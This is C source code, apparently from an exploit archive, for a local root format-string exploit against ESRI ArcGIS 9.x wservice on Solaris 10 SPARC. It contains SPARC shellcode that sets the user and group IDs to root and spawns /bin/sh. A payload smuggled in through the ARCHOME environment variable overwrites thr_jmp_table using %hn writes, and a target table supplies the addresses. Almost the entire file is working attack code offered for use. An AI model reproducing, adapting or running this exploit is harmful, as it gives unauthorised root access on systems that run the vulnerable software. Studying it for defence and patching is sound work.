/** ESRI 9.x Arcgis local root format string exploit
**
** Copyright Kevin Finisterre and John H.
** Bug found by Kevin Finisterre <kf@digitalmunition.com>
** Exploit by John H. <johnh@digitalmunition.com>
**
** We overwrite the thr_jmp_table
** Tested on solaris 10
**/

#include <dlfcn.h>
#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define VULPROG "/export/home/arcgis/arcexe9x/bin/wservice"
#define NOP                     "\xa2\x1c\x40\x11"
int             iType;

struct
{
       unsigned long retloc;
       unsigned long retaddr;
       char          *type;
}targets[] =
{

       /* bash-2.05b$ nm /usr/lib/ld.so.1 | grep thr_jmp_table
          0003a234 d thr_jmp_table
        */
       {0xff3ea234,0xffbffba8,"SunOS 5.10sun 4u sparc SUNW"},
       {0x41424344,0x41424344,"DEBUG"},
        },v;

//shellcode taken from netric
char shellcode[] =
"55"

NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP
NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP NOP

       // setreuid(0,0);

       "\x90\x1d\x80\x16"      // xor  %l6, %l6, %o0
       "\x92\x1d\x80\x16"      // xor  %l6, %l6, %o1
       "\x82\x10\x20\xca"      // mov  0xca, %g1
       "\x91\xd0\x20\x08"      // ta  8

       "\x90\x1d\x80\x16"      // xor          %l6, %l6, %o0
       "\x92\x1d\x80\x16"      // xor          %l6, %l6, %o1
       "\x82\x18\x40\x01"      // xor          %g1, %g1, %g1
       "\x82\x10\x20\xcb"      // mov          0x2e, %g1
       "\x91\xd0\x20\x08"      // ta           8                       [setregid(0,0)]

       "\x21\x0b\xd9\x19"      // sethi        %hi(0x2f646400), %l0
       "\xa0\x14\x21\x76"      // or           %l0, 0x176, %l0
       "\x23\x0b\xdd\x1d"      // sethi        %hi(0x2f747400), %l1
       "\xa2\x14\x60\x79"      // or           %l1, 0x79, %l1
       "\xe0\x3b\xbf\xf8"      // std          %l0, [ %sp - 0x8 ]
       "\x90\x23\xa0\x08"      // sub          %sp, 8, %o0
       "\x92\x1b\x80\x0e"      // xor          %sp, %sp, %o1
       "\x82\x10\x20\x05"      // mov          0x05, %g1
       "\x91\xd0\x20\x08"      // ta           8                       [open("/dev/tty",RD_ONLY)]

       "\x90\x10\x20\x02"      // mov          0x02, %o0
       "\x82\x10\x20\x29"      // mov          0x29, %g1
       "\x91\xd0\x20\x08"      // ta           8                       [dup(2)]

       "\x21\x0b\xd8\x9a"      // sethi        %hi(0x2f626800), %l0
       "\xa0\x14\x21\x6e"      // or           %l0, 0x16e, %l0
       "\x23\x0b\xcb\xdc"      // sethi        %hi(0x2f2f7000), %l1
       "\xa2\x14\x63\x68"      // or           %l1, 0x368, %l1
       "\xe0\x3b\xbf\xf0"      // std          %l0, [ %sp - 0x10 ]
       "\xc0\x23\xbf\xf8"      // clr          [ %sp - 0x8 ]
       "\x90\x23\xa0\x10"      // sub          %sp, 0x10, %o0
       "\xc0\x23\xbf\xec"      // clr          [ %sp - 0x14 ]
       "\xd0\x23\xbf\xe8"      // st           %o0, [ %sp - 0x18 ]
       "\x92\x23\xa0\x18"      // sub          %sp, 0x18, %o1
       "\x94\x22\x80\x0a"      // sub          %o2, %o2, %o2
       "\x82\x18\x40\x01"      // xor          %g1, %g1, %g1
       "\x82\x10\x20\x3b"      // mov          0x3b, %g1
       "\x91\xd0\x20\x08"      // ta           8                       [execve("/bin/sh","/bin/sh",NULL)]

       "\x82\x10\x20\x01"      // mov          0x01, %g1
       "\x91\xd0\x20\x08"      // ta           8                       [exit(?)]

       "\x10\xbf\xff\xdf"      // b            shellcode
       "\x90\x1d\x80\x16";     // or           %o1, %o1, %o1

/* Big endian */
/* sparc */
char *putLong (char* ptr, long value)
{
   *ptr++ = (char) (value >> 24) & 0xff;
   *ptr++ = (char) (value >> 16) & 0xff;
   *ptr++ = (char) (value >> 8) & 0xff;
   *ptr++ = (char) (value >> 0) & 0xff;

   return ptr;
}

/* main */
int main(int argc, char **argv)
{

   unsigned long retaddr;
   unsigned long retloc;
   int offset = 23;
   int dump_fmt=129;
   int al = 1;
   int i=0;
   int x=0;
   int c;
   unsigned long hi,lo;
   static unsigned long shift0,shift1;
   char    buf[9000];
   char    *args[24];
   char    *env[6];
   char            *ptr;
   char            padding[64];
   char            padding1[64];
   char            buf2[9000];

   if (argc < 3) {
               usage (argv[0]);
               return -1;
       }

     while((c = getopt(argc, argv, "h:t:")) != EOF) {
               switch(c) {
                       case 'h':
                               usage (argv[0]);
                               return 0;
                       case 't':
                               iType = atoi (optarg);
                               break;
                       default:
                               usage (argv[0]);
                               return 0;
               }
       }

if (argc < 2) { usage(argv[0]); exit(1); }

   if( (iType<0) || (iType>=sizeof(targets)/sizeof(v)) )
   {
       usage(argv[0]);
       printf("[-] Invalid type.\n");
       return 0;
}

   env[0] = shellcode;
   env[1] = buf2;
   env[2] = NULL;

   args[0] = VULPROG;
   args[1] = NULL;

  retloc =  targets[iType].retloc;
  retaddr = targets[iType].retaddr;

   hi = (retaddr >> 16) & 0xffff;
   lo = (retaddr >> 0) & 0xffff;

   shift0 = hi - offset - (dump_fmt * 8 + 16 + al);
   shift1 = (0x10000 +  lo) - hi;

   memset(buf,0x00,sizeof(buf));
   memset(buf2,0x00,sizeof(buf2));
   ptr = buf;

    for (i = 0; i < al; i++) {
               *ptr++ = 0x41;
       }

   ptr = putLong (ptr, 0x41414141);
   ptr = putLong (ptr, retloc);
   ptr = putLong (ptr, 0x42424242);
   ptr = putLong (ptr, retloc+2);

   for (i = 0 ; i < dump_fmt; i ++) {
               memcpy(ptr, "%.8x", 4);
               ptr = ptr + 4;
    }

   strcat(ptr,"%.");
 sprintf(ptr+strlen(ptr),"%u",shift0);
  strcat(ptr,"lx%hn");

  strcat(ptr,"%.");
   sprintf(ptr+strlen(ptr),"%u",shift1);
   strcat(ptr,"lx%hn");

   strcat(buf2,"ARCHOME=");
   memcpy(buf2+strlen(buf2),buf,strlen(buf));

   execve (args[0], args, env);
   perror ("execve");
 return 0;
}

int usage(char *p)
{
   int     i;
   printf( "Arcgis local root format string exploit\r\n");
   printf( "Usage: %s <-t target>\n",p);
   for(i=0;i<sizeof(targets)/sizeof(v);i++)
   {
       printf("%d\t%s\n", i, targets[i].type);
   }
   return 0;
}

// milw0rm.com [2005-04-30]
